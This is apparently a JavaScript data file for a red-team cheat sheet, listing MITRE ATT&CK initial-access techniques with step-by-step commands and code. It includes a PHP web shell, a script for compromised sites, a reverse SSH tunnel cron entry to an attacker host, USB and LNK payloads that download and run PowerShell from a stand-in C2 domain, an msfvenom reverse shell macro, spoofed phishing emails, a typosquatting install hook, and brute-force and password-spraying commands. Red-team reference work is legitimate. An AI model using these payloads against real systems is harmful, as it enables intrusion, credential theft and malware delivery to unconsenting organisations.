export const initialAccessTechniques = [
  {
    id: "T1189",
    name: "Drive-by Compromise",
    summary: "exploit kits • browser exploits • watering hole",
    description: "Gaining access through user web browsing via malicious or compromised websites that exploit browser or plugin vulnerabilities.",
    tags: ["T1189", "exploit kit", "browser exploit", "watering hole"],
    steps: [
      { type: "comment", content: "# Identify target watering hole sites (frequently visited by target org)" },
      { type: "text", content: "Identify websites frequently visited by target employees (trade publications, industry forums, sports sites) and compromise them." },
      { type: "comment", content: "# Inject malicious iframe into compromised site" },
      { type: "code", content: "<script>\n// Injected into compromised site\nif (navigator.userAgent.match(/Windows NT/)) {\n    window.location = 'https://exploit.c2.com/land';\n}\n</script>" },
      { type: "comment", content: "# Use BeEF for browser exploitation" },
      { type: "cmd", content: "beef-xss  # Launch BeEF framework\n# Hook browsers via XSS or injected script" },
    ]
  },
  {
    id: "T1190",
    name: "Exploit Public-Facing Application",
    summary: "CVE exploits • SQLi • RCE • web shells",
    description: "Exploiting vulnerabilities in internet-facing applications such as web servers, VPN endpoints, and web applications.",
    tags: ["T1190", "RCE", "SQLi", "web shell", "CVE"],
    steps: [
      { type: "comment", content: "# Identify vulnerable public-facing applications" },
      { type: "cmd", content: "nuclei -l targets.txt -t cves/ -t vulnerabilities/ -severity critical,high" },
      { type: "comment", content: "# Exploit SQL injection for data access or RCE" },
      { type: "cmd", content: "sqlmap -u 'https://target.com/search?q=test' --dbs --batch --random-agent" },
      { type: "comment", content: "# Deploy web shell after exploitation" },
      { type: "code", content: "<?php\n// Minimal web shell\nif(isset($_REQUEST['cmd'])){\n    echo '<pre>';\n    system($_REQUEST['cmd']);\n    echo '</pre>';\n}\n?>" },
      { type: "comment", content: "# Test for common web vulnerabilities" },
      { type: "cmd", content: "nikto -h https://target.com -Format htm -output nikto_results.html" },
    ]
  },
  {
    id: "T1133",
    name: "External Remote Services",
    summary: "VPN • RDP • Citrix • SSH • exposed services",
    description: "Using external-facing remote services such as VPNs, RDP, SSH, Citrix, and similar services as initial entry points.",
    tags: ["T1133", "VPN", "RDP", "SSH", "Citrix"],
    steps: [
      { type: "comment", content: "# Identify exposed remote services" },
      { type: "cmd", content: "nmap -sS -p 22,3389,443,8443,4433,10000 -sV target_range.txt" },
      { type: "comment", content: "# Check for vulnerable VPN versions (Pulse, Fortinet, Citrix)" },
      { type: "cmd", content: "nuclei -t cves/ -tags vpn,citrix,pulse,fortinet -l vpn_hosts.txt" },
      { type: "comment", content: "# Brute-force SSH with credential list" },
      { type: "cmd", content: "hydra -L users.txt -P passwords.txt ssh://target.com -t 4 -o ssh_results.txt" },
      { type: "comment", content: "# Exploit Citrix ADC CVE-2019-19781 (path traversal + RCE)" },
      { type: "cmd", content: "# PoC: https://github.com/trustedsec/cve-2019-19781\npython3 exploit.py https://citrix.target.com" },
    ]
  },
  {
    id: "T1200",
    name: "Hardware Additions",
    summary: "LAN Turtle • Bash Bunny • Raspberry Pi • keyloggers",
    description: "Physically introducing malicious hardware such as implants, keyloggers, or network taps into the victim environment.",
    tags: ["T1200", "LAN Turtle", "Bash Bunny", "hardware implant"],
    steps: [
      { type: "comment", content: "# Physical implant via LAN Turtle on network switch" },
      { type: "text", content: "Deploy a LAN Turtle between a network switch and a workstation. The device establishes an SSH reverse tunnel to attacker infrastructure." },
      { type: "comment", content: "# Configure LAN Turtle for reverse SSH tunnel" },
      { type: "code", content: "# /etc/crontab entry on LAN Turtle:\n*/5 * * * * ssh -R 9001:localhost:22 attacker@c2.server.com -N -f" },
      { type: "comment", content: "# Bash Bunny - USB rubber ducky style attack" },
      { type: "cmd", content: "# Copy payload to Bash Bunny switch1/payload.txt:\n# Q DELAY 1000\n# Q GUI r\n# Q STRING 'powershell -nop -w hidden -c IEX(IWR http://c2/ps1)'" },
    ]
  },
  {
    id: "T1566",
    name: "Phishing",
    summary: "GoPhish • swaks • malicious attachments • macros",
    description: "Sending phishing emails with malicious attachments or links to compromise targets. Includes spearphishing and bulk campaigns.",
    tags: ["T1566", "GoPhish", "phishing", "macros", "spearphishing"],
    steps: [
      { type: "comment", content: "# T1566.002 - Send spearphishing link with GoPhish" },
      { type: "cmd", content: "gophish  # Configure at http://127.0.0.1:3333\n# Set sending profile: SMTP server, from address\n# Create landing page cloning target login" },
      { type: "comment", content: "# T1566.001 - Craft malicious Office macro document" },
      { type: "cmd", content: "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=c2.com LPORT=443 -f vba -o payload.vba" },
      { type: "comment", content: "# T1566.001 - Send phishing email with attachment via swaks" },
      { type: "cmd", content: "swaks --to victim@target.com --from ceo@legitimate.com --server mail.target.com \\\n  --header 'Subject: Urgent: Q4 Report' \\\n  --attach invoice.docx --body 'Please review the attached document.'" },
      { type: "comment", content: "# T1566.003 - Phishing via Teams (TeamsPhisher: https://github.com/Octoberfest7/TeamsPhisher)" },
      { type: "cmd", content: "python3 TeamsPhisher.py -u attacker@tenant.com -p pass -m 'Check this: http://c2.com/malware.exe' -t victim@target.com" },
    ]
  },
  {
    id: "T1091",
    name: "Replication Through Removable Media",
    summary: "USB drops • autorun • rubber ducky",
    description: "Spreading malware through removable media such as USB drives, often using autorun features or social engineering to get execution.",
    tags: ["T1091", "USB", "autorun", "removable media"],
    steps: [
      { type: "comment", content: "# Create malicious USB payload using USB Rubber Ducky" },
      { type: "code", content: "// DuckScript payload\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -ep bypass -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://c2.com/run.ps1')\"\nENTER" },
      { type: "comment", content: "# Create LNK file payload on USB drive" },
      { type: "cmd", content: "# LNK targets cmd.exe with hidden payload:\nmshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell -nop IEX(IWR http://c2.com/p.ps1)\"\",0:close\")" },
      { type: "comment", content: "# Deploy autorun.inf on USB (older Windows)" },
      { type: "code", content: "[autorun]\nopen=payload.exe\naction=Open folder to view files\nicon=folder.ico" },
    ]
  },
  {
    id: "T1195",
    name: "Supply Chain Compromise",
    summary: "software supply chain • upstream dependencies • code injection",
    description: "Compromising software or hardware supply chains to deliver malicious code to targets through trusted update mechanisms or dependencies.",
    tags: ["T1195", "supply chain", "npm", "PyPI", "software tampering"],
    steps: [
      { type: "comment", content: "# T1195.002 - Typosquatting popular npm packages" },
      { type: "cmd", content: "# Publish malicious npm package with similar name:\nnpm publish --access public\n# Package: lodash-utils vs lodash" },
      { type: "code", content: "// Malicious package install hook (package.json)\n{\n  \"scripts\": {\n    \"postinstall\": \"node malicious.js\"\n  }\n}" },
      { type: "comment", content: "# T1195.001 - Compromise build server to inject malicious code" },
      { type: "text", content: "Gain access to CI/CD pipeline (Jenkins, GitHub Actions) and inject malicious code into the build process that gets distributed to all users." },
      { type: "comment", content: "# Dependency confusion attack" },
      { type: "cmd", content: "# Upload public package with same name as internal private package\n# npm will prefer higher version number from public registry" },
    ]
  },
  {
    id: "T1199",
    name: "Trusted Relationship",
    summary: "MSP • vendor access • partner compromise",
    description: "Gaining access to victim through compromising or abusing trusted third-party relationships such as MSPs, IT vendors, or business partners.",
    tags: ["T1199", "MSP", "third-party", "vendor access"],
    steps: [
      { type: "comment", content: "# Identify MSP or IT vendor with privileged access to target" },
      { type: "text", content: "Research the victim organization's IT vendors, MSPs, and service providers through LinkedIn, job postings, and public contracts." },
      { type: "comment", content: "# Compromise MSP RMM tool (ConnectWise, Kaseya)" },
      { type: "cmd", content: "nuclei -t cves/ -tags connectwise,kaseya,solarwinds -l msp_hosts.txt" },
      { type: "comment", content: "# Use RMM tool to execute commands on all managed clients" },
      { type: "text", content: "Once MSP is compromised, use their RMM platform to push malicious scripts or executables to all client organizations simultaneously." },
    ]
  },
  {
    id: "T1078",
    name: "Valid Accounts",
    summary: "credential stuffing • default creds • stolen creds",
    description: "Using legitimate credentials to gain initial access, including default credentials, stolen credentials, or previously compromised accounts.",
    tags: ["T1078", "credential stuffing", "default creds", "stolen accounts"],
    steps: [
      { type: "comment", content: "# T1078.001 - Try default credentials on exposed services" },
      { type: "cmd", content: "nxc smb targets.txt -u administrator -p 'admin' 'password' 'Admin123'" },
      { type: "comment", content: "# T1078.002 - Credential stuffing against cloud login portals" },
      { type: "cmd", content: "credmaster -m okta -u emails.txt -p passwords.txt --threads 50 -o results.json" },
      { type: "comment", content: "# T1078.004 - Authenticate to cloud services with stolen tokens" },
      { type: "cmd", content: "az login --service-principal -u APP_ID -p CLIENT_SECRET --tenant TENANT_ID" },
      { type: "comment", content: "# Check for valid O365 credentials" },
      { type: "cmd", content: "o365spray --spray -U users.txt -P 'Winter2024!' -d target.com --count 1 --lockout 1" },
    ]
  },
];